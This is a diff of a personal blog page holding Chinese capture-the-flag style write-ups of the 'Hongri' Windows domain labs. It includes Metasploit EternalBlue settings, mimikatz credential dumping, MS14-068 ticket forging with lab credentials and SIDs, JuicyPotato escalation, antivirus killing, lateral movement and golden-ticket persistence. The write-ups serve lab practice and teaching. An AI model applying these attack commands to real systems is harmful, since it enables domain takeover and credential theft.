+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260325193755-evsxr3i.png" alt="image"></p>
+<p>有 445 端口，先尝试一下永恒之蓝</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue 
+# 设置正向连接，让目标机开放一个端口进行监听，攻击机主动连接这个端口
+set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp
+set proxies socks5:127.0.0.1:1080
+# 设置了一个自动运行的后渗透脚本，只要建立会话，就立即进程迁移
+set autorunscript post&#x2F;windows&#x2F;manage&#x2F;migrate</code></pre>
 
-特权信息
-----------------------
+<p>这里没有设置这个进程迁移就会一直失败</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260325195818-9hkybm0.png" alt="image"></p>
+<p>成功拿到了用户密码</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260325195854-epu94ds.png" alt="image"></p>
+<p>在用户的桌面发现了一个工具 <code>MS14-068</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260325200120-36ysm9r.png" alt="image"></p>
+<p>查看这些参数</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260325200224-hrzioof.png" alt="image"></p>
+<blockquote>
+<p><code>-u</code>：用户名@域名</p>
+<p><code>-s</code>：用户 SID</p>
+<p><code>-d</code>：域控制器地址</p>
+<p><code>-p</code>：明文密码</p>
+<p><code>--rc4</code>：没有明文密码的情况下使用 NTLM hash 登录</p>
+</blockquote>
+<p>接下来就是收集这些信息</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">kiwi_cmd sekurlsa::logonpasswords</code></pre>
 
-特权名                          描述                       状态
-&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
-SeIncreaseQuotaPrivilege        为进程调整内存配额         已禁用
-SeSecurityPrivilege             管理审核和安全日志         已禁用
-SeTakeOwnershipPrivilege        取得文件或其他对象的所有权 已禁用
-SeLoadDriverPrivilege           加载和卸载设备驱动程序     已禁用
-SeSystemProfilePrivilege        配置文件系统性能           已禁用
-SeSystemtimePrivilege           更改系统时间               已禁用
-SeProfileSingleProcessPrivilege 配置文件单个进程           已禁用
-SeIncreaseBasePriorityPrivilege 提高计划优先级             已禁用
-SeCreatePagefilePrivilege       创建一个页面文件           已禁用
-SeBackupPrivilege               备份文件和目录             已禁用
-SeRestorePrivilege              还原文件和目录             已禁用
-SeShutdownPrivilege             关闭系统                   已禁用
-SeDebugPrivilege                调试程序                   已启用
-SeSystemEnvironmentPrivilege    修改固件环境值             已禁用
-SeChangeNotifyPrivilege         绕过遍历检查               已启用
-SeRemoteShutdownPrivilege       从远程系统强制关机         已禁用
-SeUndockPrivilege               从扩展坞上取下计算机       已禁用
-SeManageVolumePrivilege         执行卷维护任务             已禁用
-SeImpersonatePrivilege          身份验证后模拟客户端       已启用
-SeCreateGlobalPrivilege         创建全局对象               已启用
-SeIncreaseWorkingSetPrivilege   增加进程工作集             已禁用
-SeTimeZonePrivilege             更改时区                   已禁用
-SeCreateSymbolicLinkPrivilege   创建符号链接               已禁用</code></pre>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260325201220-7n3sq8r.png" alt="image"></p>
+<p>这个漏洞的原理是一个叫做 <code>PAC</code>​ 的认证，用户请求域控时，就会将用户的信息打包成 <code>PAC</code>​，放在 TGT 中发给用户，并且会签名<br>但是在有漏洞的地方，域控允许客户端指定签名算法，导致域控会将伪造的 <code>PAC</code> 封装成一个新的 TGT 返回给攻击者</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">MS14-068.exe -u douser@demo.com -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.52.130 -p Dotest123</code></pre>
 
-<p>成功提权</p>
-<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">C:\Windows\Temp\JuicyPotato.exe -t t -p &quot;C:\Windows\Temp\tcp_windows_amd64.exe&quot; -l 1337</code></pre>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260325201656-wxlebzq.png" alt="image"></p>
+<p>这里会返回一个票据注入到内存中，我们还需要将这个票据注入到内存中</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260325201731-s2vz42a.png" alt="image"></p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash"># 清空当前会话的票据
+kerberos::purge 
+# 注入伪造的票据
+kerberos::ptc TGT_douser@demo.com.ccache</code></pre>
 
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260312193354-naeasiv.png" alt="image"></p>
-<p>傻了，纠结半天，我可以直接 rdp 上去把 360 杀了</p>
-<p><del>结果杀了依旧停止工作，我真没招了</del></p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260312203441-434zxl4.png" alt="image"></p>
-<p>找到问题了，应该是这个 ip 限制的问题，原本是使用的 wsl 打开的 cs，后面修改成用我的 ubuntu 起 cs，ip 修改为 192.168.154.130 之后就可以了</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260314151253-sjeftlx.png" alt="image"></p>
-<p>然后直接权限提升</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260314151412-rs3pl36.png" alt="image"></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260325202033-v0c28hu.png" alt="image"></p>
+<p>然后就拥有了域控权限</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260325202411-pmc5zku.png" alt="image"></p>
+<p>这里的工具都给备好，直接使用，测试已经成功了</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260325205946-x6c2nbf.png" alt="image"></p>
 <p>‍</p>
-<p>‍</p>
-<p>‍</p>
-<h3 id="内网横向"><a href="#内网横向" class="headerlink" title="内网横向"></a>内网横向</h3><h4 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h4><p>这里另一个 IP 应该就是内网网段的 IP <code>10.10.10.0/24</code></p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260312193443-i3nj6q0.png" alt="image"></p>
-<p>执行插件 mimikatz，成功获取到了用户密码 <code>admin@123</code></p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260312194030-9ztbgmq.png" alt="image"></p>
-<p>这里获取域信息会报错</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260314151629-krbcywy.png" alt="image"></p>
-<p>获取域信息，这里确定在域中</p>
-<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">net config workstation</code></pre>
-
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260312200645-tu8io5r.png" alt="image"></p>
-<p>可以使用这个命令查看域内信息，这个是不会报错的，成功获取了域内信息</p>
-<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">net computers</code></pre>
-
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260314152002-mma1jk7.png" alt="image"></p>
-<p>进行端口扫描，扫到有 445 端口</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260314152629-qxl7ngy.png" alt="image"></p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260314152613-a1gkak5.png" alt="image"></p>
-<p>另一台机子也是一样开启了 445</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260314153308-i0rwx0h.png" alt="image"></p>
-<p>‍</p>
-<h4 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h4><p>这里确认了域控机器开启了 445 端口，那就尝试横向连接上去</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260314152818-tdwcabh.png" alt="image"></p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260314153000-tu5za4s.png" alt="image"></p>
-<p>成功上线</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260314153020-2jfebui.png" alt="image"></p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260314153010-0z0ta1j.png" alt="image"></p>
-<p>另一台</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260314153432-p0ucvz6.png" alt="image"></p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260314153439-xp6yaee.png" alt="image"></p>
-<h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><p>这里需要创建一个黄金票据，如果被下线了，只要又掌握了另一台外网服务器，就可以使用黄金票据恢复域管理员的身份</p>
-<p>获取黄金票据需要 4 个信息</p>
-<ol>
-<li>域的 SID 安全标识符</li>
-<li>域的名称</li>
-<li><code>krbtgt</code> 账户的 NTLM Hash</li>
-<li>需要伪造的用户</li>
-</ol>
-<p>获取到 SID</p>
-<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">shell whoami &#x2F;all
-S-1-5-18</code></pre>
-
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260314154629-bedvosu.png" alt="image"></p>
-<p>获取域名</p>
-<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">shell ipconfig &#x2F;all
-de1ay.com</code></pre>
-
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260314154723-7uepidh.png" alt="image"></p>
-<p>‍</p>
-<p>获取到 <code>krbtgt</code>​ 的哈希，NTLM 是最后一部分的 hash，这个是格式是<br>​<code>用户名:RID:LM Hash:NTLM Hash:::</code></p>
-<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">82dfc71b72a11ef37d663047bc2088fb</code></pre>
-
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260314154330-gqu8e13.png" alt="image"></p>
-<p>需要伪造的用户</p>
-<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">net user</code></pre>
-
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260314154901-l1lls3g.png" alt="image"></p>
-<p>然后要切换目录到 C 盘中</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260314155036-g5np88d.png" alt="image"></p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260314155051-5t3a5ze.png" alt="image"></p>
-<p>输入信息</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260314155128-2sv0v7t.png" alt="image"></p>
-<p>生成成功</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260314155202-y8x45tw.png" alt="image"></p>
-<p>另一种确认方法</p>
-<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">run klist</code></pre>
-
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260314155251-gsxyvar.png" alt="image"></p>
-<p>然后需要创建黄金票据，刚才只是生成了，现在需要创建一个文件来保存</p>
-<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">mimikatz kerberos::list &#x2F;export</code></pre>
-
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260314155413-4v9xy3v.png" alt="image"></p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260314155427-bu52zl1.png" alt="image"></p>
-<p>然后需要将这两个文件下载下来</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260314155628-6k6mqzd.png" alt="image"></p>
-<p>这里下载的两个文件在虚拟机中</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260314155748-euvccyd.png" alt="image"></p>
 
                 
             </div>
@@ -692,7 +563,7 @@ de1ay.com</code></pre>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://wwwmarin.xyz/2026/03/20/hong-ri-ba-chang-2/">https://wwwmarin.xyz/2026/03/20/hong-ri-ba-chang-2/</a>
+                    <a href="https://wwwmarin.xyz/2026/03/23/hong-ri-ba-chang-4/">https://wwwmarin.xyz/2026/03/23/hong-ri-ba-chang-4/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -814,14 +685,15 @@ de1ay.com</code></pre>
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2026/03/23/hong-ri-ba-chang-5/">
+                <a href="/2026/03/23/hong-ri-ba-chang-4/">
                     <div class="card-image">
                         
-                        <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20240819_015830.jpg" class="responsive-img" alt="红日靶场 4">
+                        <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/dauisgdascuigsgciua.jpg" class="responsive-img" alt="红日靶场 4">
                         
                         <span class="card-title">红日靶场 4</span>
                     </div>
@@ -833,9 +705,9 @@ de1ay.com</code></pre>
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2026-03-23
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2026-03-23
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -848,6 +720,7 @@ de1ay.com</code></pre>
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -870,12 +743,12 @@ de1ay.com</code></pre>
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2026/03/17/hong-ri-ba-chang-1/">
+                <a href="/2026/03/23/hong-ri-ba-chang-3/">
                     <div class="card-image">
                         
-                        <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/76dty8y5jpmit0o32n6a4dpr3.jpg" class="responsive-img" alt="红日靶场 1">
+                        <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20230618_234051.jpg" class="responsive-img" alt="红日靶场 3">
                         
-                        <span class="card-title">红日靶场 1</span>
+                        <span class="card-title">红日靶场 3</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -886,7 +759,7 @@ de1ay.com</code></pre>
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2026-03-17
+                                <i class="far fa-clock fa-fw icon-date"></i>2026-03-23
                             </span>
                         <span class="publish-author">
                             
